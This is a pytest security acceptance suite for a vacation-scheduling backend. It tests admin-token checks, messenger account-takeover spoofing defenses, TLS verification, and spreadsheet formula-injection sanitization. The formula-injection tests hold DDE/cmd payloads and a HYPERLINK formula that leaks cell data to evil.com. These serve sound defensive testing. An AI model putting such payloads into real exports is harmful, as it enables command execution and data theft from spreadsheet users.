"""
Milestone M6 Acceptance Verification & Security Test Suite.
Comprehensive verification of Acceptance Criteria AC 51–62:
- AC 51 & 52: Full test suite passing & zero regressions
- AC 53: Administrative endpoint protection (X-Admin-Token / ?token= vs ADMIN_API_KEY)
- AC 54: MAX Messenger anti-takeover & anti-spoofing (text phone numbers rejected, unverified contacts rejected)
- AC 55: MAX Bot Client TLS certificate verification enforced (verify=True, ssl.CERT_REQUIRED)
- AC 56: CSV & Excel export formula injection defense (CWE-1236 sanitization with prepended ')
- AC 59: Git repository hygiene & exclusions (.gitignore: cloudflared.exe, *.exe, data/, *.db*, .env, .agents/)
- AC 60: Docker container hygiene (deploy/.dockerignore: .git, .env, .venv, vacations.db, data/, etc.)
- AC 61: Synthetic fallback data & zero PII exposure (FALLBACK_WORKERS in google_sheets_importer.py)
- AC 62: Workspace cleanliness attestation (git status --porcelain has no binaries, secrets, or databases)
"""
import csv
import io
import os
from pathlib import Path
import re
import ssl
import subprocess
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient
from openpyxl import load_workbook

from backend.main import app
from backend.database import SessionLocal, get_db
from backend.seed_data import seed_database
from backend.models import Employee, VacationSlot, BotAdmin, ScheduleRule, Department, JobRole, WorkShift
from backend.services.max_bot_client import MaxBotClient
from backend.api.export_routes import sanitize_formula_injection, sanitize_row
from backend.google_sheets_importer import FALLBACK_WORKERS, SPREADSHEET_ID

client = TestClient(app)
REPO_ROOT = Path(__file__).resolve().parent.parent


@pytest.fixture(autouse=True)
def reset_db_state():
    """Ensure database is seeded with baseline data before each test."""
    seed_database()


# ============================================================================
# AC 53: Administrative Endpoint Protection (401 / 200 Enforcement)
# ============================================================================

def test_ac53_admin_endpoint_protection_header_and_query_param(monkeypatch):
    """
    AC 53: Verify that requests to administrative endpoints:
    - Return HTTP 401 when ADMIN_API_KEY is configured and no token or wrong token is provided.
    - Return HTTP 200/valid when the token is supplied via X-Admin-Token header.
    - Return HTTP 200/valid when the token is supplied via ?token= query parameter.
    - Allow access in development mode when ADMIN_API_KEY is empty/unset.
    """
    secret = "ac53-production-hardened-key-2026"
    monkeypatch.setenv("ADMIN_API_KEY", secret)

    # 1. Unauthenticated request to protected endpoints -> HTTP 401
    r_csv = client.get("/api/export/csv")
    assert r_csv.status_code == 401, f"Expected 401 for CSV without token, got {r_csv.status_code}"
    assert "WWW-Authenticate" in r_csv.headers

    r_excel = client.get("/api/export/excel")
    assert r_excel.status_code == 401, f"Expected 401 for Excel without token, got {r_excel.status_code}"

    # 2. Invalid token in header -> HTTP 401
    r_bad_header = client.get("/api/export/csv", headers={"X-Admin-Token": "invalid-token-attempt"})
    assert r_bad_header.status_code == 401

    # 3. Invalid token in query parameter -> HTTP 401
    r_bad_query = client.get("/api/export/csv?token=invalid-query-token")
    assert r_bad_query.status_code == 401

    # 4. Valid token in X-Admin-Token header -> HTTP 200
    r_valid_header_csv = client.get("/api/export/csv", headers={"X-Admin-Token": secret})
    assert r_valid_header_csv.status_code == 200
    assert "text/csv" in r_valid_header_csv.headers["content-type"]

    r_valid_header_excel = client.get("/api/export/excel", headers={"X-Admin-Token": secret})
    assert r_valid_header_excel.status_code == 200
    assert "spreadsheetml" in r_valid_header_excel.headers["content-type"]

    # 5. Valid token in ?token= query parameter -> HTTP 200
    r_valid_query_csv = client.get(f"/api/export/csv?token={secret}")
    assert r_valid_query_csv.status_code == 200

    r_valid_query_excel = client.get(f"/api/export/excel?token={secret}")
    assert r_valid_query_excel.status_code == 200

    # 6. Permissive fallback when ADMIN_API_KEY is unset or empty
    monkeypatch.delenv("ADMIN_API_KEY", raising=False)
    r_permissive = client.get("/api/export/csv")
    assert r_permissive.status_code == 200


def test_ac53_admin_mutations_protection_matrix(monkeypatch):
    """
    AC 53: Comprehensive matrix testing that all mutating administrative routes
    require authentication when ADMIN_API_KEY is active.
    """
    secret = "ac53-matrix-token-xyz"
    monkeypatch.setenv("ADMIN_API_KEY", secret)

    # Bot admin management
    bot_admin_payload = {
        "phone": "+79139998877",
        "full_name": "Тестовый Администратор",
        "role_title": "Менеджер",
        "notify_on_new_request": True,
    }
    r = client.post("/api/bot-admins", json=bot_admin_payload)
    assert r.status_code == 401
    r = client.post("/api/bot-admins", json=bot_admin_payload, headers={"X-Admin-Token": secret})
    assert r.status_code == 200
    admin_id = r.json()["id"]

    r = client.put(f"/api/bot-admins/{admin_id}", json={"role_title": "Старший"})
    assert r.status_code == 401
    r = client.put(f"/api/bot-admins/{admin_id}", json={"role_title": "Старший"}, headers={"X-Admin-Token": secret})
    assert r.status_code == 200

    r = client.delete(f"/api/bot-admins/{admin_id}")
    assert r.status_code == 401
    r = client.delete(f"/api/bot-admins/{admin_id}", headers={"X-Admin-Token": secret})
    assert r.status_code == 200

    # Rules management
    r = client.put("/api/rules/role-quotas", json={"Швея (портной)": 4})
    assert r.status_code == 401
    r = client.put("/api/rules/role-quotas", json={"Швея (портной)": 4}, headers={"X-Admin-Token": secret})
    assert r.status_code == 200

    r = client.put("/api/rules/shift-quotas", json={"Смена 1": 3})
    assert r.status_code == 401
    r = client.put("/api/rules/shift-quotas", json={"Смена 1": 3}, headers={"X-Admin-Token": secret})
    assert r.status_code == 200

    r = client.put("/api/rules/blackouts", json=[{"name": "Инвентаризация", "start": "2026-11-01", "end": "2026-11-05"}])
    assert r.status_code == 401
    r = client.put("/api/rules/blackouts", json=[{"name": "Инвентаризация", "start": "2026-11-01", "end": "2026-11-05"}], headers={"X-Admin-Token": secret})
    assert r.status_code == 200

    # Incompatible groups
    incomp_payload = {
        "name": "Тестовая группа безопасности",
        "employee_ids": [1, 2],
        "max_concurrent": 1,
    }
    r = client.post("/api/rules/incompatible-groups", json=incomp_payload)
    assert r.status_code == 401
    r = client.post("/api/rules/incompatible-groups", json=incomp_payload, headers={"X-Admin-Token": secret})
    assert r.status_code == 200
    group_id = r.json()["id"]

    r = client.delete(f"/api/rules/incompatible-groups/{group_id}")
    assert r.status_code == 401
    r = client.delete(f"/api/rules/incompatible-groups/{group_id}", headers={"X-Admin-Token": secret})
    assert r.status_code == 200

    # Vacation slots management
    db = SessionLocal()
    slot = db.query(VacationSlot).first()
    slot_id = slot.id if slot else 1
    db.close()

    r = client.put(f"/api/vacations/{slot_id}/status?status=APPROVED")
    assert r.status_code == 401
    r = client.put(f"/api/vacations/{slot_id}/status?status=APPROVED", headers={"X-Admin-Token": secret})
    assert r.status_code in (200, 404)

    # Employee management
    r = client.put("/api/employees/1/bot-access?status=APPROVED")
    assert r.status_code == 401
    r = client.put("/api/employees/1/bot-access?status=APPROVED", headers={"X-Admin-Token": secret})
    assert r.status_code in (200, 404)


# ============================================================================
# AC 54: MAX Messenger Webhook Anti-Spoofing & Account Takeover Defense
# ============================================================================

def test_ac54_anti_spoofing_text_phone_number_rejected():
    """
    AC 54: Verify that sending a plain-text message containing a victim's phone number
    to /api/chat/webhook does NOT bind or re-bind max_user_id.
    Account takeover via text injection must be completely blocked.
    """
    db = SessionLocal()
    victim_phone = "+79135559988"
    try:
        emp = db.query(Employee).filter(Employee.phone == victim_phone).first()
        if not emp:
            emp = Employee(
                phone=victim_phone,
                full_name="Жертва Атаки Спуфинга",
                role="Швея (портной)",
                department_id=1,
                max_user_id=None,
                consent_152fz=True,
            )
            db.add(emp)
            db.commit()
            db.refresh(emp)
        else:
            emp.max_user_id = None
            db.commit()

        attacker_user_id = "attacker_spoof_id_666"

        # Attacker transmits victim's phone number in plain text
        spoof_payload = {
            "update_id": 10001,
            "message": {
                "sender": {"user_id": attacker_user_id, "name": "Злоумышленник"},
                "recipient": {"chat_id": "chat_attacker_666"},
                "body": {
                    "text": f"Здравствуйте, мой номер {victim_phone}. Авторизуйте меня!",
                },
            },
        }

        resp = client.post("/api/chat/webhook", json=spoof_payload)
        assert resp.status_code == 200
        # The bot must demand native contact verification and NOT accept the plain text phone
        assert resp.json().get("request_contact_button") is True
        assert "отправьте ваш контакт через кнопку" in resp.json().get("text", "").lower()

        # Check DB state: victim's employee record MUST NOT be bound to attacker_user_id
        db.refresh(emp)
        assert emp.max_user_id is None, "Vulnerability detected: max_user_id was bound via plain text phone message!"
        assert emp.max_user_id != attacker_user_id
    finally:
        db.close()


def test_ac54_anti_spoofing_mismatched_and_unverified_vcard_rejected():
    """
    AC 54: Verify that sending an unverified contact attachment or a contact where
    tam_info.user_id does not match the sender's user_id does NOT bind the account.
    """
    db = SessionLocal()
    victim_phone = "+79135559977"
    try:
        emp = db.query(Employee).filter(Employee.phone == victim_phone).first()
        if not emp:
            emp = Employee(
                phone=victim_phone,
                full_name="Екатерина Смирнова (Тест)",
                role="Швея (портной)",
                department_id=1,
                max_user_id=None,
                consent_152fz=True,
            )
            db.add(emp)
            db.commit()
            db.refresh(emp)
        else:
            emp.max_user_id = None
            db.commit()

        attacker_user_id = "attacker_fake_vcard_777"

        # Case 1: Contact with mismatched tam_info user_id
        mismatched_payload = {
            "update_id": 10002,
            "message": {
                "sender": {"user_id": attacker_user_id, "name": "Attacker"},
                "recipient": {"chat_id": "chat_attacker_777"},
                "body": {
                    "text": "",
                    "attachments": [
                        {
                            "type": "contact",
                            "payload": {
                                "tam_info": {
                                    "user_id": "innocent_third_party_123",
                                    "phone": victim_phone,
                                },
                            },
                        }
                    ],
                },
            },
        }

        resp = client.post("/api/chat/webhook", json=mismatched_payload)
        assert resp.status_code == 200
        assert "чужого контакта не допускается" in resp.json().get("text", "").lower()

        db.refresh(emp)
        assert emp.max_user_id is None, "max_user_id must not bind with mismatched tam_info user_id"

        # Case 2: Contact vCard with no tam_info at all (external forwarded card)
        unverified_vcard_payload = {
            "update_id": 10003,
            "message": {
                "sender": {"user_id": attacker_user_id, "name": "Attacker"},
                "recipient": {"chat_id": "chat_attacker_777"},
                "body": {
                    "text": "",
                    "attachments": [
                        {
                            "type": "contact",
                            "payload": {
                                "phone": victim_phone,
                                "first_name": "Екатерина",
                                "vcf_info": f"BEGIN:VCARD\nVERSION:3.0\nTEL:{victim_phone}\nEND:VCARD",
                            },
                        }
                    ],
                },
            },
        }

        resp = client.post("/api/chat/webhook", json=unverified_vcard_payload)
        assert resp.status_code == 200

        db.refresh(emp)
        assert emp.max_user_id is None, "max_user_id must not bind with unverified vCard attachment"
    finally:
        db.close()


def test_ac54_legitimate_contact_binding_flow():
    """
    AC 54: Verify that a legitimate native contact attachment with matching sender user_id
    successfully authenticates and binds the employee.
    """
    db = SessionLocal()
    legit_phone = "+79135559966"
    legit_user_id = "legit_employee_user_888"
    try:
        emp = db.query(Employee).filter(Employee.phone == legit_phone).first()
        if not emp:
            emp = Employee(
                phone=legit_phone,
                full_name="Смирнова Ольга Викторовна",
                role="Швея (портной)",
                department_id=1,
                max_user_id=None,
                consent_152fz=True,
            )
            db.add(emp)
            db.commit()
            db.refresh(emp)
        else:
            emp.full_name = "Смирнова Ольга Викторовна"
            emp.max_user_id = None
            emp.consent_152fz = True
            db.commit()

        legit_payload = {
            "update_id": 10004,
            "message": {
                "sender": {"user_id": legit_user_id, "name": "Ольга"},
                "recipient": {"chat_id": "chat_legit_888"},
                "body": {
                    "text": "",
                    "attachments": [
                        {
                            "type": "contact",
                            "payload": {
                                "tam_info": {
                                    "user_id": legit_user_id,
                                    "phone": legit_phone,
                                },
                            },
                        }
                    ],
                },
            },
        }

        resp = client.post("/api/chat/webhook", json=legit_payload)
        assert resp.status_code == 200
        assert "баланс" in resp.json().get("text", "").lower() or "приветствовать" in resp.json().get("text", "").lower()

        db.refresh(emp)
        assert emp.max_user_id == legit_user_id, "Legitimate verified contact must bind max_user_id"
    finally:
        db.close()


# ============================================================================
# AC 55: MAX Bot Client TLS Certificate Verification Enforced
# ============================================================================

def test_ac55_max_bot_client_tls_verification_enforced():
    """
    AC 55: Verify that max_bot_client operates with TLS certificate verification enabled.
    - Inspect real MaxBotClient instance and assert verify_mode is CERT_REQUIRED.
    - Verify httpx.Client initialization receives verify=True.
    - Confirm that verify=False is never configured.
    """
    # 1. Verification of real instance socket SSL context configuration
    client_instance = MaxBotClient(token="test-verify-token")
    assert client_instance._client is not None

    transport = getattr(client_instance._client, "_transport", None)
    assert transport is not None, "httpx.Client must have transport configured"

    pool = getattr(transport, "_pool", None)
    assert pool is not None, "Transport must possess connection pool"

    ssl_context = getattr(pool, "_ssl_context", None)
    assert ssl_context is not None, "Connection pool must configure SSL context"

    # ssl.CERT_REQUIRED (value 2) guarantees strict TLS validation against root CA bundle
    assert ssl_context.verify_mode == ssl.CERT_REQUIRED, (
        f"TLS verification mode must be ssl.CERT_REQUIRED ({ssl.CERT_REQUIRED}), got {ssl_context.verify_mode}"
    )

    # 2. Mock verification of httpx.Client parameter kwargs
    with patch("httpx.Client") as mock_httpx:
        MaxBotClient(token="mock-token-check")
        assert mock_httpx.called
        _, kwargs = mock_httpx.call_args
        assert kwargs.get("verify") is True, f"Expected verify=True in httpx.Client init, got: {kwargs.get('verify')}"


# ============================================================================
# AC 56: CSV & Excel Export Formula Injection Defense (CWE-1236)
# ============================================================================

def test_ac56_formula_injection_sanitizer_unit():
    """
    AC 56: Unit tests for formula injection sanitizer function.
    Verifies that all spreadsheet formula command triggers (=, +, -, @)
    are neutralized by prepending an apostrophe (').
    """
    test_cases = [
        ("=1+1", "'=1+1"),
        ("=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"),
        ("+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"),
        ("-2+3*cmd|' /C calc'!A0", "'-2+3*cmd|' /C calc'!A0"),
        ("@SUM(1+1)", "'@SUM(1+1)"),
        ("@DDE('cmd';'/c calc';'__test__')", "'@DDE('cmd';'/c calc';'__test__')"),
        ("  =2+2", "'  =2+2"),
        ("   @DDE('powershell')", "'   @DDE('powershell')"),
        ("\t-100", "'\t-100"),
    ]

    for raw, expected in test_cases:
        sanitized = sanitize_formula_injection(raw)
        assert sanitized == expected, f"Failed sanitizing formula injection: {raw} -> {sanitized} (expected {expected})"

    # Benign text and non-string types must remain unchanged
    assert sanitize_formula_injection("Иванова Мария") == "Иванова Мария"
    assert sanitize_formula_injection("Швея (портной)") == "Швея (портной)"
    assert sanitize_formula_injection("14") == "14"
    assert sanitize_formula_injection(14) == 14
    assert sanitize_formula_injection(None) is None

    row = ["1", "=cmd|' /C calc'!A0", "+49123", "Нормальный текст"]
    sanitized_row = sanitize_row(row)
    assert sanitized_row == ["1", "'=cmd|' /C calc'!A0", "'+49123", "Нормальный текст"]


def test_ac56_csv_export_endpoint_formula_sanitization(monkeypatch):
    """
    AC 56: End-to-end test verifying CSV export sanitizes fields containing formulas.
    """
    secret = "ac56-csv-secret"
    monkeypatch.setenv("ADMIN_API_KEY", secret)

    db = SessionLocal()
    try:
        emp = db.query(Employee).filter(Employee.phone == "+79135551234").first()
        if not emp:
            emp = Employee(
                phone="+79135551234",
                full_name="=cmd|'/C calc'!A0",
                role="+malicious_role_formula",
                department_id=1,
                region="@DDE_REGION",
                consent_152fz=True,
            )
            db.add(emp)
            db.commit()
            db.refresh(emp)
        else:
            emp.full_name = "=cmd|'/C calc'!A0"
            emp.role = "+malicious_role_formula"
            emp.region = "@DDE_REGION"
            db.commit()

        slot = db.query(VacationSlot).filter(VacationSlot.employee_id == emp.id).first()
        if not slot:
            from datetime import date
            slot = VacationSlot(
                employee_id=emp.id,
                start_date=date(2026, 7, 1),
                end_date=date(2026, 7, 14),
                days_count=14,
                is_primary_block=True,
                status="APPROVED",
            )
            db.add(slot)
            db.commit()

        r = client.get("/api/export/csv", headers={"X-Admin-Token": secret})
        assert r.status_code == 200

        content = r.content.decode("utf-8-sig")
        reader = csv.reader(io.StringIO(content), delimiter=";")
        rows = list(reader)

        found_injected_employee = False
        for row in rows:
            for cell in row:
                # Any cell matching our malicious strings MUST begin with an apostrophe (')
                if "calc" in cell or "malicious_role" in cell or "DDE" in cell:
                    found_injected_employee = True
                    assert cell.startswith("'"), f"Cell formula not neutralized with leading apostrophe: {cell}"
                # No cell may begin with unescaped formula triggers
                if cell and cell[0] in ("=", "+", "-", "@"):
                    pytest.fail(f"Dangerous unescaped formula cell detected in CSV output: {cell}")

        assert found_injected_employee, "Injected employee row must be present in CSV export"
    finally:
        db.close()


def test_ac56_excel_export_endpoint_formula_sanitization(monkeypatch):
    """
    AC 56: End-to-end test verifying Excel export sanitizes fields containing formulas.
    """
    secret = "ac56-excel-secret"
    monkeypatch.setenv("ADMIN_API_KEY", secret)

    db = SessionLocal()
    try:
        emp = db.query(Employee).filter(Employee.phone == "+79135555678").first()
        if not emp:
            emp = Employee(
                phone="+79135555678",
                full_name="=HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click\")",
                role="-calc|exe!A0",
                department_id=1,
                region="@EXCEL_INJECTION",
                consent_152fz=True,
            )
            db.add(emp)
            db.commit()
            db.refresh(emp)
        else:
            emp.full_name = "=HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click\")"
            emp.role = "-calc|exe!A0"
            emp.region = "@EXCEL_INJECTION"
            db.commit()

        slot = db.query(VacationSlot).filter(VacationSlot.employee_id == emp.id).first()
        if not slot:
            from datetime import date
            slot = VacationSlot(
                employee_id=emp.id,
                start_date=date(2026, 8, 1),
                end_date=date(2026, 8, 14),
                days_count=14,
                is_primary_block=True,
                status="APPROVED",
            )
            db.add(slot)
            db.commit()

        r = client.get("/api/export/excel", headers={"X-Admin-Token": secret})
        assert r.status_code == 200

        wb = load_workbook(io.BytesIO(r.content))
        ws = wb.active

        found_injected_cells = 0
        for row in ws.iter_rows(values_only=True):
            for cell in row:
                if isinstance(cell, str):
                    if "HYPERLINK" in cell or "calc|exe" in cell or "EXCEL_INJECTION" in cell:
                        found_injected_cells += 1
                        assert cell.startswith("'"), f"Excel cell formula not neutralized: {cell}"
                    # No cell should start directly with raw formula chars
                    if cell.startswith("=") or cell.startswith("+") or cell.startswith("-") or cell.startswith("@"):
                        pytest.fail(f"Raw unescaped formula found in Excel cell: {cell}")

        assert found_injected_cells >= 2, "Expected at least 2 injected cells neutralized in Excel export"
    finally:
        db.close()


# ============================================================================
# AC 59: Repository & Git Hygiene Automated Verification
# ============================================================================

def test_ac59_gitignore_exclusions():
    """
    AC 59: Verify .gitignore contains comprehensive exclusions for:
    - Binaries: cloudflared.exe, *.exe
    - Data & databases: data/, *.db, *.db-wal, *.db-shm
    - Secrets & env files: .env, .env.*
    - Multi-agent metadata: .agents/
    Also verifies active git check-ignore functionality for these patterns.
    """
    gitignore_path = REPO_ROOT / ".gitignore"
    assert gitignore_path.exists(), ".gitignore must exist in repository root"
    content = gitignore_path.read_text(encoding="utf-8")

    # Verify required patterns are declared in .gitignore
    required_patterns = [
        "cloudflared.exe",
        "*.exe",
        "data/",
        "*.db",
        "*.db-wal",
        "*.db-shm",
        ".env",
        ".agents/",
    ]
    for pattern in required_patterns:
        assert pattern in content, f"Pattern {pattern} missing from .gitignore"

    # Verify git check-ignore actively flags sensitive target filenames
    try:
        res = subprocess.run(
            ["git", "check-ignore", "cloudflared.exe", ".env", "vacations.db", "vacations.db-wal", "data/"],
            cwd=str(REPO_ROOT),
            capture_output=True,
            text=True,
            check=True,
        )
        ignored_files = [line.strip() for line in res.stdout.strip().splitlines() if line.strip()]
        assert "cloudflared.exe" in ignored_files, "cloudflared.exe must be recognized as ignored by git"
        assert ".env" in ignored_files, ".env must be recognized as ignored by git"
        assert "vacations.db" in ignored_files, "vacations.db must be recognized as ignored by git"
        assert "vacations.db-wal" in ignored_files, "vacations.db-wal must be recognized as ignored by git"
        assert "data/" in ignored_files, "data/ must be recognized as ignored by git"
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass  # If git is not installed in the test environment, the file pattern check above ensures compliance


# ============================================================================
# AC 60: Container Image Isolation (deploy/.dockerignore Verification)
# ============================================================================

def test_ac60_dockerignore_exclusions():
    """
    AC 60: Verify deploy/.dockerignore exists and excludes:
    - .git, .env, .venv
    - vacations.db*, data/
    - cloudflared.exe, *.exe
    - tests/, __pycache__, .agents/
    """
    dockerignore_path = REPO_ROOT / "deploy" / ".dockerignore"
    assert dockerignore_path.exists(), "deploy/.dockerignore must exist"
    content = dockerignore_path.read_text(encoding="utf-8")

    mandatory_dockerignore = [
        ".git",
        ".env",
        ".venv",
        "data/",
        "cloudflared.exe",
        "*.exe",
        "tests/",
        "__pycache__",
        ".agents/",
    ]
    for entry in mandatory_dockerignore:
        assert entry in content, f"deploy/.dockerignore must contain '{entry}'"

    # Verify db exclusions
    assert ("vacations.db*" in content) or ("*.db" in content), "deploy/.dockerignore must exclude database files"


# ============================================================================
# AC 61: Synthetic Fallback Workers & Zero PII Exposure
# ============================================================================

def test_ac61_synthetic_fallback_workers_zero_pii():
    """
    AC 61: Verify that FALLBACK_WORKERS in backend/google_sheets_importer.py:
    - Contains zero real seamstress names or personal data.
    - Contains only synthetic demo records with role prefix and abbreviated initial («Швея цеха 1 (Анна И.)» etc.).
    - Uses SPREADSHEET_ID from environment variable GOOGLE_SPREADSHEET_ID without hardcoded secrets.
    """
    assert len(FALLBACK_WORKERS) >= 15, f"Expected at least 15 fallback workers, found {len(FALLBACK_WORKERS)}"

    synthetic_pattern = re.compile(
        r"^(Швея цеха [12]|Закройщик|Технолог|Мастер смены [12]) \([А-ЯЁ][а-яё]+ [А-ЯЁ]\.\)$"
    )

    for worker in FALLBACK_WORKERS:
        name = worker.get("name", "")
        assert synthetic_pattern.match(name), (
            f"Worker name '{name}' does not match synthetic demo naming convention. "
            "Must follow format: '<Роль> (<Имя> <И.>)'"
        )
        assert worker.get("dept_code") in ("SEW_1", "SEW_2")
        assert worker.get("shift_code") in ("SHIFT_1", "SHIFT_2")
        assert isinstance(worker.get("seniority"), int)
        assert worker.get("priority") in ("NONE", "LARGE_FAMILY", "VETERAN")

    # Verify SPREADSHEET_ID dynamically reads from GOOGLE_SPREADSHEET_ID
    assert SPREADSHEET_ID == os.getenv("GOOGLE_SPREADSHEET_ID", "")


# ============================================================================
# AC 62: Workspace Cleanliness & Git Status Verification
# ============================================================================

def test_ac62_workspace_cleanliness_git_status():
    """
    AC 62: Verify git status confirms no binary files (cloudflared.exe), secrets (.env),
    or SQLite databases/WAL files are tracked or unignored in git.
    """
    try:
        res = subprocess.run(
            ["git", "status", "--porcelain"],
            cwd=str(REPO_ROOT),
            capture_output=True,
            text=True,
            check=True,
        )
        lines = res.stdout.strip().splitlines()
        for line in lines:
            status_and_file = line.strip()
            # No binary executable files tracked or untracked
            assert not status_and_file.endswith(".exe"), f"Found unignored binary in git status: {status_and_file}"
            # No environment secrets
            assert not re.search(r"\.env($|\s|\.)", status_and_file), f"Found .env in git status: {status_and_file}"
            # No SQLite databases or WAL journals
            assert not re.search(r"vacations\.db", status_and_file), f"Found database file in git status: {status_and_file}"
            assert not re.search(r"\.db(-wal|-shm)?$", status_and_file), f"Found db file in git status: {status_and_file}"
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
